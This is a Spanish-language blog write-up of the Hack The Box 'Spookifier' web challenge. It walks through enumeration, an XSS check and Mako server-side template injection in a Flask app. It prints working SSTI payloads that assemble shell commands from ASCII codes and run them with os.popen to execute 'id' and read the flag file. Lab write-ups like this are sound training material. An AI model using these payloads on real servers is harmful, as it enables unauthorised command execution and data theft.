---
layout: post
title: Hack The Box Spookifier Write-Up
date: 2024-11-24
categories: [Write-Ups, HackTheBox, Challenge, Very-Easy]
tags: [SSTI, Halloween, Flask, Mako, Very-Easy, Web]
---
# Hack The Box: Spookifier Write-Up
El **challenge very-easy** [Spookifier](https://app.hackthebox.com/challenges/413) de [Hack The Box](https://app.hackthebox.com/) trata de la explotación de la vulnerabilidad web **SSTI en Flask**.
Casos reales de la vulnerabilidad:
- [HackerOne Report](https://hackerone.com/reports/125980)
## Enumeration
Iniciamos la instancia del reto, la cual nos representa una web con tematica de Halloween la cual si indicamos un string nos lo modifica con diferentes fuentes de letra al puro estilo Halloween.
![Webpage](/assets/post_details/spookifier/spookifier_webpage.png)

Realizamos una enumeración rapida con **whatweb** la cual nos encuentra que se esta ejecutando **python** en el servidor web, lo cual es interesante.
```bash
whatweb http://94.237.62.166:32266
```
![WhatWeb](/assets/post_details/spookifier/spookifier_whatweb.png)

En la pagina web, a traves del **dom** o input introducimos un payload basico de **xss**, el cual es exitoso por lo que vemos que es suceptible a ataques de [DOM based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).
![DOM based XSS](/assets/post_details/spookifier/spookifier_dom_based_xss.png)

Lo primero que pensamos al ser susceptible a ataques **XSS** que esta puede ser explotada mediante **SSTI** ya que tambien corre **python**, analizando los archivos del reto, podemos analizar que esta utilizando el framework **Flask** el cual se le conoce por ataques **SSTI**.

Se puede apreciar que en el archivo **routes.py** es totalmente vulnerable a **SSTI** ya que no existe sanitización alguna, este articulo habla sobre las distintas fases de descubrir un **SSTI en Flask**:
- [SSTI in Flask](https://payatu.com/blog/server-side-template-injectionssti/)
```js
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
    
    return render_template('index.html',output='')
```

En nuestro caso el payload **SSTI** nos funciona de la siguiente manera `${7*7}` el cual realiza la operación.
![SSTI Payload Test](/assets/post_details/spookifier/spookifier_ssti_payload_test.png)
## Solution
En este articulo podemos ver la forma que utilizamos de explotación para templates **Mako** mediante caracteres **ASCII** ejecutamos comandos:
- [SSTI YesWeHack Explained](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
```js
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```
![ID ASCII](/assets/post_details/spookifier/spookifier_ssti_payload_id.png)

Y mediante `cat ..\flag.txt` en **ASCII** obtenemos la flag, la ruta la sabemos mediante la estructura de los archivos descargados.
```js
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[99,97,116,32,46,46,47,102,108,97,103,46,116,120,116])).read()}
```
![Get Flag](/assets/post_details/spookifier/spookifier_flag.png)